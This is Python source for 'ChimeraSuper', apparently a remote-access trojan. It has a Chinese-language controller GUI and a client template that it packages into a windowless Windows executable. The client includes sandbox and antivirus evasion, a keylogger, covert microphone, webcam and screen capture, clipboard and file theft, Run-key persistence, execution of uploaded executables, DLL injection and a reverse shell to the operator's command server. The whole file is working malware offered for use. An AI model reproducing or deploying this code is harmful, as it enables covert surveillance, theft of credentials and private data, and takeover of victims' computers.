# ChimeraSuper.py - 三大远控框架合成版（全功能桌面主控端）
# 功能清单：
# 系统管理：终端、进程、窗口、远程桌面、文件、语音、视频、服务、注册表、剪贴板、键盘记录、持久化
# 高级渗透：反向Shell（交互式）、内存加载PE、进程注入与迁移、EDR/AV检测
# 隐蔽通信：TCP直连模式

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
import socket
import threading
import subprocess
import os
import sys
import json
import struct
import time
import base64
import io
import tempfile
import random
from PIL import Image, ImageTk

# ================== 客户端模板（TCP模式 - 完整原版） ==================
CLIENT_TCP_TEMPLATE = r'''
import socket, subprocess, json, struct, time, platform, os, threading, sys, winreg, ctypes, base64, io
import pyaudio, wave
import win32clipboard as clip
from PIL import ImageGrab, Image
from pynput import keyboard
import cv2
import win32gui, win32con, win32service, win32serviceutil
import tempfile, random, requests

# ---------- 反沙箱/EDR检测模块 ----------
def anti_sandbox():
    try:
        if os.cpu_count() < 2: return False
        mem = ctypes.windll.kernel32.GlobalMemoryStatusEx
        mi = ctypes.create_string_buffer(64)
        ctypes.memmove(mi, b'\x40\x00\x00\x00', 4)
        mem(mi)
        total = int.from_bytes(mi[4:8], 'little') // (1024**3)
        if total < 3: return False
        for p in ['vmtoolsd','vboxservice','xenserver']:
            if subprocess.run(f'tasklist /fi "imagename eq {p}.exe"', shell=True, capture_output=True).stdout.find(p.encode())!=-1:
                return False
        edr = ['MsMpEng','SenseCnc','Symantec','McAfee','CrowdStrike']
        for e in edr:
            if subprocess.run(f'tasklist /fi "imagename eq {e}*"', shell=True, capture_output=True).stdout.find(e.encode())!=-1:
                time.sleep(60)
        return True
    except: return True

# ---------- 键盘记录模块 ----------
keylog = []
def on_press(key):
    try: keylog.append(key.char)
    except: keylog.append(f'[{key}]')
    if len(keylog)>1000: keylog.pop(0)
def keylogger_loop():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# ---------- 录音模块 ----------
def record_audio(sec=5):
    try:
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=16000, input=True, frames_per_buffer=1024)
        frames = [stream.read(1024) for _ in range(int(16000/1024*sec))]
        stream.stop_stream(); stream.close(); p.terminate()
        buf = io.BytesIO()
        wf = wave.open(buf, 'wb')
        wf.setnchannels(1); wf.setsampwidth(p.get_sample_size(pyaudio.paInt16)); wf.setframerate(16000)
        wf.writeframes(b''.join(frames)); wf.close()
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e: return f"ERROR:{e}"

# ---------- 剪贴板模块 ----------
def get_clip():
    try:
        clip.OpenClipboard(0); data=clip.GetClipboardData(); clip.CloseClipboard(); return data
    except: return ""
def set_clip(text):
    try:
        clip.OpenClipboard(0); clip.EmptyClipboard(); clip.SetClipboardText(text); clip.CloseClipboard(); return "OK"
    except Exception as e: return f"ERROR:{e}"

# ---------- 窗口管理模块 ----------
def list_windows():
    windows=[]
    def enum(hwnd, lParam):
        if win32gui.IsWindowVisible(hwnd):
            windows.append((hwnd, win32gui.GetWindowText(hwnd)))
    win32gui.EnumWindows(enum, None)
    return json.dumps(windows)
def close_window(hwnd):
    win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
    return "OK"
def hide_window(hwnd):
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    return "OK"
def show_window(hwnd):
    win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
    return "OK"

# ---------- 服务管理模块 ----------
def list_services():
    try:
        out = subprocess.check_output('sc query state= all', shell=True).decode('gbk')
        services=[]
        for line in out.split('\n'):
            if 'SERVICE_NAME' in line:
                name=line.split(':')[1].strip()
                services.append(name)
        return json.dumps(services)
    except: return "[]"
def start_service(name):
    subprocess.run(f'sc start {name}', shell=True, capture_output=True)
    return "OK"
def stop_service(name):
    subprocess.run(f'sc stop {name}', shell=True, capture_output=True)
    return "OK"

# ---------- 注册表管理模块 ----------
def reg_read(key, subkey, value):
    try:
        hkey = getattr(winreg, key)
        with winreg.OpenKey(hkey, subkey) as k:
            data, _ = winreg.QueryValueEx(k, value)
            return str(data)
    except Exception as e: return f"ERROR:{e}"
def reg_write(key, subkey, value, data):
    try:
        hkey = getattr(winreg, key)
        with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, value, 0, winreg.REG_SZ, data)
        return "OK"
    except Exception as e: return f"ERROR:{e}"
def reg_delete(key, subkey, value):
    try:
        hkey = getattr(winreg, key)
        with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, value)
        return "OK"
    except Exception as e: return f"ERROR:{e}"

# ---------- 摄像头捕获模块 ----------
def capture_cam():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buf = cv2.imencode('.jpg', frame)
            return base64.b64encode(buf).decode()
        else: return "ERROR"
    except: return "ERROR"

# ---------- 内存加载PE模块 ----------
def load_pe_memory(b64_pe):
    try:
        pe_data = base64.b64decode(b64_pe)
        temp = tempfile.NamedTemporaryFile(delete=False, suffix='.exe')
        temp.write(pe_data)
        temp.close()
        subprocess.Popen(temp.name, shell=True)
        os.unlink(temp.name)
        return "OK"
    except Exception as e: return f"ERROR:{e}"

# ---------- 进程注入DLL模块 ----------
def inject_dll(pid, dll_path):
    try:
        kernel32 = ctypes.windll.kernel32
        hProc = kernel32.OpenProcess(0x1F0FFF, False, pid)
        if not hProc: return "ERROR: OpenProcess"
        addr = kernel32.VirtualAllocEx(hProc, None, 1024, 0x3000, 0x40)
        if not addr: return "ERROR: VirtualAlloc"
        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(hProc, addr, dll_path.encode(), len(dll_path), ctypes.byref(written))
        kernel32.CreateRemoteThread(hProc, None, 0, addr, 0, 0, None)
        return "OK"
    except Exception as e: return f"ERROR:{e}"

# ---------- 交互式反向Shell模块 ----------
def reverse_shell(sock):
    while True:
        try:
            cmd = sock.recv(1024).decode()
            if cmd.lower() == 'exit': break
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            sock.send(stdout + stderr)
        except: break

# ---------- 基础控制与管理模块 ----------
def exec_cmd(cmd):
    try: return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60).decode('gbk', errors='ignore')
    except Exception as e: return str(e)

def capture_screen():
    try:
        img = ImageGrab.grab(); buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=50)
        return base64.b64encode(buf.getvalue()).decode()
    except: return ""

def download_file(path):
    try: 
        with open(path, 'rb') as f: return base64.b64encode(f.read()).decode()
    except Exception as e: return f"ERROR:{e}"

def upload_file(path, b64):
    try:
        with open(path, 'wb') as f: f.write(base64.b64decode(b64)); return "OK"
    except Exception as e: return f"ERROR:{e}"

def list_procs():
    try:
        out = subprocess.check_output("tasklist /fo csv", shell=True).decode('gbk').splitlines()
        procs = []
        for line in out[1:]:
            p = line.strip('"').split('","')
            if len(p)>=2: procs.append({"name": p[0], "pid": p[1]})
        return json.dumps(procs)
    except: return "[]"

def kill_proc(pid):
    try: subprocess.run(f"taskkill /PID {pid} /F", shell=True, check=True); return "OK"
    except Exception as e: return f"ERROR:{e}"

def add_persistence():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "ChimeraClient", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(handle); return "OK"
    except: return "FAIL"

# ---------- 客户端主循环逻辑 ----------
C2_IP, C2_PORT = "%s", %s
sock = None
running = True

def main_tcp():
    global sock, running
    if not anti_sandbox(): sys.exit(0)
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((C2_IP, C2_PORT))
            info = json.dumps({"type": "register", "host": platform.node(), "os": platform.platform()})
            sock.send(struct.pack('>I', len(info)) + info.encode())
            threading.Thread(target=keylogger_loop, daemon=True).start()
            while running:
                raw = sock.recv(4)
                if not raw: break
                length = struct.unpack('>I', raw)[0]
                data = sock.recv(length).decode()
                if not data: break
                req = json.loads(data)
                cmd, params = req.get('cmd'), req.get('params', {})
                resp = {"seq": req.get('seq'), "result": ""}
                
                if cmd == "exec": resp["result"] = exec_cmd(params.get('cmd',''))
                elif cmd == "screenshot": resp["result"] = capture_screen()
                elif cmd == "download": resp["result"] = download_file(params.get('path',''))
                elif cmd == "upload": resp["result"] = upload_file(params.get('path',''), params.get('data',''))
                elif cmd == "list_procs": resp["result"] = list_procs()
                elif cmd == "kill_proc": resp["result"] = kill_proc(params.get('pid',0))
                elif cmd == "persistence": resp["result"] = add_persistence()
                elif cmd == "get_keylog": 
                    global keylog
                    resp["result"] = ''.join(keylog[-200:])
                elif cmd == "record_audio": resp["result"] = record_audio(params.get('seconds',5))
                elif cmd == "get_clipboard": resp["result"] = get_clip()
                elif cmd == "set_clipboard": resp["result"] = set_clip(params.get('text',''))
                elif cmd == "list_windows": resp["result"] = list_windows()
                elif cmd == "close_window": resp["result"] = close_window(params.get('hwnd',0))
                elif cmd == "hide_window": resp["result"] = hide_window(params.get('hwnd',0))
                elif cmd == "show_window": resp["result"] = show_window(params.get('hwnd',0))
                elif cmd == "list_services": resp["result"] = list_services()
                elif cmd == "start_service": resp["result"] = start_service(params.get('name',''))
                elif cmd == "stop_service": resp["result"] = stop_service(params.get('name',''))
                elif cmd == "reg_read": resp["result"] = reg_read(params.get('key',''), params.get('subkey',''), params.get('value',''))
                elif cmd == "reg_write": resp["result"] = reg_write(params.get('key',''), params.get('subkey',''), params.get('value',''), params.get('data',''))
                elif cmd == "reg_delete": resp["result"] = reg_delete(params.get('key',''), params.get('subkey',''), params.get('value',''))
                elif cmd == "capture_cam": resp["result"] = capture_cam()
                elif cmd == "load_pe": resp["result"] = load_pe_memory(params.get('b64_pe',''))
                elif cmd == "inject_dll": resp["result"] = inject_dll(params.get('pid',0), params.get('dll_path',''))
                elif cmd == "reverse_shell_start":
                    threading.Thread(target=reverse_shell, args=(sock,), daemon=True).start()
                    resp["result"] = "OK"
                else: resp["result"] = "Unknown"
                
                sock.send(struct.pack('>I', len(json.dumps(resp))) + json.dumps(resp).encode())
        except:
            time.sleep(5)

if __name__ == "__main__":
    add_persistence()
    main_tcp()
'''

# ================== 主控端GUI完整实现 ==================
class ChimeraSuper:
    def __init__(self, root):
        self.root = root
        root.title("🧬 Chimera 超级合成主控端（完整版）")
        root.geometry("1000x750")
        self.clients = {}
        self.client_info = {}
        self.selected = None
        self.running = False
        self.server = None
        self.lock = threading.Lock()
        self.comm_mode = tk.StringVar(value="tcp")

        # ---- 顶部控制面板 ----
        top = tk.Frame(root); top.pack(fill=tk.X, pady=5, padx=5)
        tk.Label(top, text="IP:").pack(side=tk.LEFT)
        self.ip_entry = tk.Entry(top, width=14); self.ip_entry.pack(side=tk.LEFT, padx=2)
        self.ip_entry.insert(0, "0.0.0.0")
        tk.Label(top, text="端口:").pack(side=tk.LEFT)
        self.port_entry = tk.Entry(top, width=6); self.port_entry.pack(side=tk.LEFT, padx=2)
        self.port_entry.insert(0, "4444")
        
        tk.Button(top, text="生成客户端", command=self.build_client, bg="#8fcbff", width=10).pack(side=tk.LEFT, padx=5)
        tk.Button(top, text="启动监听", command=self.start_listen, bg="#8fff8f", width=10).pack(side=tk.LEFT, padx=2)
        tk.Button(top, text="停止监听", command=self.stop_listen, bg="#ff8f8f", width=10).pack(side=tk.LEFT, padx=2)
        self.status_label = tk.Label(top, text="● 未监听", fg="red")
        self.status_label.pack(side=tk.LEFT, padx=15)

        # ---- 在线主机栏 ----
        f = tk.Frame(root); f.pack(fill=tk.X, padx=5, pady=2)
        tk.Label(f, text="在线主机列表:").pack(side=tk.LEFT)
        self.listbox = tk.Listbox(f, height=4, width=50)
        self.listbox.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.listbox.bind('<<ListboxSelect>>', self.on_select)
        tk.Button(f, text="刷新列表", command=self.refresh_clients).pack(side=tk.RIGHT)

        # ---- 多功能标签页组件 (Notebook) ----
        self.nb = ttk.Notebook(root)
        self.nb.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 1. 命令控制台
        t1 = tk.Frame(self.nb); self.nb.add(t1, text="终端命令")
        self.cmd_entry = tk.Entry(t1); self.cmd_entry.pack(fill=tk.X, padx=5, pady=5)
        self.cmd_entry.bind('<Return>', lambda e: self.send_cmd())
        tk.Button(t1, text="执行命令", command=self.send_cmd).pack()
        self.cmd_out = scrolledtext.ScrolledText(t1, height=12)
        self.cmd_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 2. 屏幕监控
        t2 = tk.Frame(self.nb); self.nb.add(t2, text="远程桌面")
        tk.Button(t2, text="刷新当前屏幕", command=self.get_screen).pack(pady=5)
        self.screen_label = tk.Label(t2)
        self.screen_label.pack()

        # 3. 文件管理
        t3 = tk.Frame(self.nb); self.nb.add(t3, text="文件管理")
        tk.Label(t3, text="目标文件路径:").pack()
        self.file_path = tk.Entry(t3, width=70); self.file_path.pack(pady=5)
        self.file_path.insert(0, "C:\\")
        bf = tk.Frame(t3); bf.pack()
        tk.Button(bf, text="下载文件", command=self.download_file).pack(side=tk.LEFT, padx=5)
        tk.Button(bf, text="上传文件", command=self.upload_file).pack(side=tk.LEFT, padx=5)
        self.file_out = scrolledtext.ScrolledText(t3, height=8)
        self.file_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 4. 进程管理
        t4 = tk.Frame(self.nb); self.nb.add(t4, text="进程管理")
        self.proc_list = tk.Listbox(t4, height=12)
        self.proc_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        pf = tk.Frame(t4); pf.pack()
        tk.Button(pf, text="刷新进程", command=self.list_procs).pack(side=tk.LEFT, padx=5)
        tk.Button(pf, text="结束选中进程", command=self.kill_proc).pack(side=tk.LEFT, padx=5)

        # 5. 键盘记录
        t5 = tk.Frame(self.nb); self.nb.add(t5, text="键盘记录")
        tk.Button(t5, text="获取实时按键", command=self.get_keylog).pack(pady=5)
        self.key_out = scrolledtext.ScrolledText(t5, height=12)
        self.key_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 6. 语音监听
        t6 = tk.Frame(self.nb); self.nb.add(t6, text="音频监听")
        tk.Button(t6, text="开始录音 5秒", command=self.record_audio).pack(pady=5)
        self.audio_result = tk.Label(t6, text="", fg="blue")
        self.audio_result.pack()
        tk.Button(t6, text="下载录音文件", command=self.download_audio).pack(pady=5)

        # 7. 剪贴板操作
        t7 = tk.Frame(self.nb); self.nb.add(t7, text="剪贴板")
        tk.Button(t7, text="获取剪贴板内容", command=self.get_clip).pack(pady=5)
        self.clip_entry = tk.Entry(t7, width=70); self.clip_entry.pack(pady=5)
        tk.Button(t7, text="远程设置剪贴板", command=self.set_clip).pack()
        self.clip_out = scrolledtext.ScrolledText(t7, height=6)
        self.clip_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 8. 窗口控制
        t8 = tk.Frame(self.nb); self.nb.add(t8, text="窗口控制")
        tk.Button(t8, text="列出系统可见窗口", command=self.list_windows).pack(pady=5)
        self.win_list = tk.Listbox(t8, height=10); self.win_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        wf = tk.Frame(t8); wf.pack()
        tk.Button(wf, text="关闭窗口", command=self.close_window).pack(side=tk.LEFT, padx=5)
        tk.Button(wf, text="隐藏窗口", command=self.hide_window).pack(side=tk.LEFT, padx=5)
        tk.Button(wf, text="显示窗口", command=self.show_window).pack(side=tk.LEFT, padx=5)

        # 9. 服务管理
        t9 = tk.Frame(self.nb); self.nb.add(t9, text="系统服务")
        tk.Button(t9, text="列出系统服务", command=self.list_services).pack(pady=5)
        self.srv_list = tk.Listbox(t9, height=10); self.srv_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        sf = tk.Frame(t9); sf.pack()
        tk.Button(sf, text="启动服务", command=self.start_service).pack(side=tk.LEFT, padx=5)
        tk.Button(sf, text="停止服务", command=self.stop_service).pack(side=tk.LEFT, padx=5)

        # 10. 注册表管理
        t10 = tk.Frame(self.nb); self.nb.add(t10, text="注册表")
        tk.Label(t10, text="根键 (例: HKEY_CURRENT_USER):").pack()
        self.reg_key = tk.Entry(t10, width=40); self.reg_key.pack(pady=2); self.reg_key.insert(0, "HKEY_CURRENT_USER")
        tk.Label(t10, text="子键路径:").pack()
        self.reg_subkey = tk.Entry(t10, width=70); self.reg_subkey.pack(pady=2)
        tk.Label(t10, text="键值名称:").pack()
        self.reg_value = tk.Entry(t10, width=40); self.reg_value.pack(pady=2)
        tk.Label(t10, text="写入数据:").pack()
        self.reg_data = tk.Entry(t10, width=70); self.reg_data.pack(pady=2)
        rbf = tk.Frame(t10); rbf.pack()
        tk.Button(rbf, text="读取", command=self.reg_read).pack(side=tk.LEFT, padx=5)
        tk.Button(rbf, text="写入", command=self.reg_write).pack(side=tk.LEFT, padx=5)
        tk.Button(rbf, text="删除", command=self.reg_delete).pack(side=tk.LEFT, padx=5)
        self.reg_out = scrolledtext.ScrolledText(t10, height=5)
        self.reg_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 11. 摄像头监控
        t11 = tk.Frame(self.nb); self.nb.add(t11, text="摄像头")
        tk.Button(t11, text="截取摄像头画面", command=self.capture_cam).pack(pady=5)
        self.cam_label = tk.Label(t11)
        self.cam_label.pack()

        # 12. 高级渗透模块
        t12 = tk.Frame(self.nb); self.nb.add(t12, text="高级渗透")
        tk.Label(t12, text="内存加载PE (输入base64编码的exe):").pack()
        self.pe_entry = tk.Entry(t12, width=80); self.pe_entry.pack(pady=2)
        tk.Button(t12, text="执行内存加载", command=self.load_pe).pack(pady=2)
        
        tk.Label(t12, text="进程注入DLL (PID, 目标DLL绝对路径):").pack()
        inj_frame = tk.Frame(t12); inj_frame.pack()
        self.inject_pid = tk.Entry(inj_frame, width=10); self.inject_pid.pack(side=tk.LEFT, padx=5)
        self.inject_dll = tk.Entry(inj_frame, width=60); self.inject_dll.pack(side=tk.LEFT, padx=5)
        tk.Button(t12, text="执行DLL注入", command=self.inject_dll_cmd).pack(pady=2)
        
        tk.Button(t12, text="启动交互式Shell通信", command=self.reverse_shell_start).pack(pady=5)
        self.shell_out = scrolledtext.ScrolledText(t12, height=6)
        self.shell_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 13. 持久化管理
        t13 = tk.Frame(self.nb); self.nb.add(t13, text="持久化控制")
        tk.Button(t13, text="写入注册表自启动持久化", command=self.do_persistence).pack(pady=15)
        self.persist_result = tk.Label(t13, text="", fg="green")
        self.persist_result.pack()

        # ---- 底部状态栏 ----
        self.status_bar = tk.Label(root, text="就绪 - 等待操作", anchor="w", fg="gray")
        self.status_bar.pack(fill=tk.X, padx=5, pady=2)
        
        self.audio_b64 = None
        self.refresh_clients()

    def log(self, msg):
        self.status_bar.config(text=msg)
        self.root.update()

    # ---- 客户端编译打包逻辑 ----
    def build_client(self):
        ip = self.ip_entry.get()
        port = self.port_entry.get()
        if ip == "0.0.0.0":
            try: ip = socket.gethostbyname(socket.gethostname())
            except: pass
        try: port = int(port)
        except: messagebox.showerror("错误", "端口必须为数字"); return
        
        # 1. 写入客户端代码文件
        code = CLIENT_TCP_TEMPLATE % (ip, port)
        with open("client.py", "w", encoding="utf-8") as f: 
            f.write(code)
            
        self.log("正在打包 client.exe ...")
        
        # 2. 改用 PyInstaller 库内部接口直接调用，避免 9009 环境变量错误
        try:
            import PyInstaller.__main__
            
            # 执行打包参数：单文件、无黑窗口、命名为 client
            PyInstaller.__main__.run([
                'client.py',
                '--onefile',
                '--noconsole',
                '--name',
                'client'
            ])
            
            # 3. 检查生成结果并自动移动到同级目录
            if os.path.exists("dist/client.exe"):
                if os.path.exists("client.exe"):
                    os.remove("client.exe")
                os.replace("dist/client.exe", "client.exe")
                self.log("client.exe 生成成功！")
                messagebox.showinfo("成功", "client.exe 已在当前目录下生成")
            else:
                messagebox.showerror("失败", "打包未生成目标文件，请确认已安装 pyinstaller")
        except Exception as e:
            messagebox.showerror("错误", f"打包出错: {e}")

    def stop_listen(self):
        self.running = False
        if self.server: self.server.close()
        self.status_label.config(text="● 已停止", fg="red")
        self.log("监听服务已关闭")

    def accept_clients(self):
        while self.running:
            try:
                conn, addr = self.server.accept()
                ip = addr[0]
                with self.lock: self.clients[ip] = conn
                try:
                    raw = conn.recv(4)
                    if raw:
                        length = struct.unpack('>I', raw)[0]
                        data = conn.recv(length).decode()
                        info = json.loads(data)
                        with self.lock: self.client_info[ip] = {"host": info.get('host'), "os": info.get('os')}
                        self.log(f"新主机上线: {ip}")
                        self.root.after(0, self.refresh_clients)
                except: pass
            except: break

    def refresh_clients(self):
        self.listbox.delete(0, tk.END)
        with self.lock:
            for ip in self.clients.keys():
                host = self.client_info.get(ip, {}).get('host', 'Unknown')
                self.listbox.insert(tk.END, f"{ip}  ({host})")

    def on_select(self, event):
        sel = self.listbox.curselection()
        if sel: self.selected = self.listbox.get(sel[0]).split(' ')[0]

    def send_request(self, cmd, params={}):
        if not self.selected:
            messagebox.showwarning("提示", "请先在上方列表选择目标主机")
            return None
        with self.lock: conn = self.clients.get(self.selected)
        if not conn:
            messagebox.showwarning("提示", "所选主机已离线")
            return None
        try:
            req = {"cmd": cmd, "params": params, "seq": int(time.time()*1000)%100000}
            msg = json.dumps(req).encode()
            conn.send(struct.pack('>I', len(msg)) + msg)
            raw = conn.recv(4)
            if not raw: raise Exception("连接断开")
            length = struct.unpack('>I', raw)[0]
            return json.loads(conn.recv(length).decode())
        except Exception as e:
            self.log(f"通信错误: {e}")
            with self.lock:
                if self.selected in self.clients: del self.clients[self.selected]
            self.root.after(0, self.refresh_clients)
            return None

    # ---- 各项控制动作实现 ----
    def send_cmd(self):
        cmd = self.cmd_entry.get().strip()
        if not cmd: return
        resp = self.send_request("exec", {"cmd": cmd})
        if resp:
            self.cmd_out.insert(tk.END, f"> {cmd}\n{resp.get('result','')}\n")
            self.cmd_out.see(tk.END)

    def get_screen(self):
        resp = self.send_request("screenshot")
        if resp and resp.get('result'):
            try:
                img = Image.open(io.BytesIO(base64.b64decode(resp['result'])))
                img.thumbnail((500,400))
                tk_img = ImageTk.PhotoImage(img)
                self.screen_label.config(image=tk_img)
                self.screen_label.image = tk_img
            except: pass

    def download_file(self):
        path = self.file_path.get().strip()
        if not path: return
        resp = self.send_request("download", {"path": path})
        if resp:
            data = resp.get('result')
            if data and not data.startswith("ERROR"):
                local = os.path.basename(path) or "downloaded_file"
                with open(local, "wb") as f: f.write(base64.b64decode(data))
                self.file_out.insert(tk.END, f"文件下载成功: {local}\n")
            else: self.file_out.insert(tk.END, f"文件下载失败: {data}\n")

    def upload_file(self):
        path = self.file_path.get().strip()
        if not path: return
        local = filedialog.askopenfilename()
        if not local: return
        try:
            with open(local, "rb") as f: b64 = base64.b64encode(f.read()).decode()
            resp = self.send_request("upload", {"path": path, "data": b64})
            if resp: self.file_out.insert(tk.END, f"上传结果: {resp.get('result','')}\n")
        except Exception as e: self.file_out.insert(tk.END, f"上传出错: {e}\n")

    def list_procs(self):
        resp = self.send_request("list_procs")
        if resp:
            try:
                procs = json.loads(resp.get('result', '[]'))
                self.proc_list.delete(0, tk.END)
                for p in procs: self.proc_list.insert(tk.END, f"PID: {p['pid']} - {p['name']}")
            except: pass

    def kill_proc(self):
        sel = self.proc_list.curselection()
        if not sel: return
        pid = self.proc_list.get(sel[0]).split(' ')[1]
        resp = self.send_request("kill_proc", {"pid": int(pid)})
        if resp: self.list_procs()

    def get_keylog(self):
        resp = self.send_request("get_keylog")
        if resp:
            self.key_out.delete('1.0', tk.END)
            self.key_out.insert(tk.END, resp.get('result',''))

    def record_audio(self):
        resp = self.send_request("record_audio", {"seconds": 5})
        if resp:
            self.audio_b64 = resp.get('result','')
            if self.audio_b64.startswith("ERROR"):
                self.audio_result.config(text=self.audio_b64, fg="red")
            else:
                self.audio_result.config(text="录音成功 (5秒)", fg="green")

    def download_audio(self):
        if not self.audio_b64 or self.audio_b64.startswith("ERROR"): return
        try:
            with open("record.wav", "wb") as f: f.write(base64.b64decode(self.audio_b64))
            messagebox.showinfo("成功", "录音已保存为 record.wav")
        except Exception as e: messagebox.showerror("错误", str(e))

    def get_clip(self):
        resp = self.send_request("get_clipboard")
        if resp:
            self.clip_out.delete('1.0', tk.END)
            self.clip_out.insert(tk.END, resp.get('result',''))

    def set_clip(self):
        self.send_request("set_clipboard", {"text": self.clip_entry.get()})

    def list_windows(self):
        resp = self.send_request("list_windows")
        if resp:
            try:
                self.win_list.delete(0, tk.END)
                for hwnd, title in json.loads(resp.get('result','[]')):
                    self.win_list.insert(tk.END, f"[{hwnd}] {title}")
            except: pass

    def close_window(self):
        sel = self.win_list.curselection()
        if sel: self.send_request("close_window", {"hwnd": int(self.win_list.get(sel[0]).split(']')[0][1:])})

    def hide_window(self):
        sel = self.win_list.curselection()
        if sel: self.send_request("hide_window", {"hwnd": int(self.win_list.get(sel[0]).split(']')[0][1:])})

    def show_window(self):
        sel = self.win_list.curselection()
        if sel: self.send_request("show_window", {"hwnd": int(self.win_list.get(sel[0]).split(']')[0][1:])})

    def list_services(self):
        resp = self.send_request("list_services")
        if resp:
            try:
                self.srv_list.delete(0, tk.END)
                for s in json.loads(resp.get('result','[]')): self.srv_list.insert(tk.END, s)
            except: pass

    def start_service(self):
        sel = self.srv_list.curselection()
        if sel: self.send_request("start_service", {"name": self.srv_list.get(sel[0])})

    def stop_service(self):
        sel = self.srv_list.curselection()
        if sel: self.send_request("stop_service", {"name": self.srv_list.get(sel[0])})

    def reg_read(self):
        resp = self.send_request("reg_read", {"key": self.reg_key.get(), "subkey": self.reg_subkey.get(), "value": self.reg_value.get()})
        if resp:
            self.reg_out.delete('1.0', tk.END)
            self.reg_out.insert(tk.END, resp.get('result',''))

    def reg_write(self):
        self.send_request("reg_write", {"key": self.reg_key.get(), "subkey": self.reg_subkey.get(), "value": self.reg_value.get(), "data": self.reg_data.get()})

    def reg_delete(self):
        self.send_request("reg_delete", {"key": self.reg_key.get(), "subkey": self.reg_subkey.get(), "value": self.reg_value.get()})

    def capture_cam(self):
        resp = self.send_request("capture_cam")
        if resp and resp.get('result') and not resp['result'].startswith("ERROR"):
            try:
                img = Image.open(io.BytesIO(base64.b64decode(resp['result'])))
                img.thumbnail((400,300))
                tk_img = ImageTk.PhotoImage(img)
                self.cam_label.config(image=tk_img)
                self.cam_label.image = tk_img
            except: pass

    def load_pe(self):
        b64 = self.pe_entry.get().strip()
        if b64: self.send_request("load_pe", {"b64_pe": b64})

    def inject_dll_cmd(self):
        try: pid = int(self.inject_pid.get())
        except: return
        self.send_request("inject_dll", {"pid": pid, "dll_path": self.inject_dll.get().strip()})

    def reverse_shell_start(self):
        self.send_request("reverse_shell_start")
        self.shell_out.insert(tk.END, "交互式Shell反向连接已下发\n")

    def do_persistence(self):
        resp = self.send_request("persistence")
        if resp: self.persist_result.config(text=f"持久化执行结果: {resp.get('result','')}", fg="blue")

if __name__ == "__main__":
    root = tk.Tk()
    app = ChimeraSuper(root)
    root.mainloop()
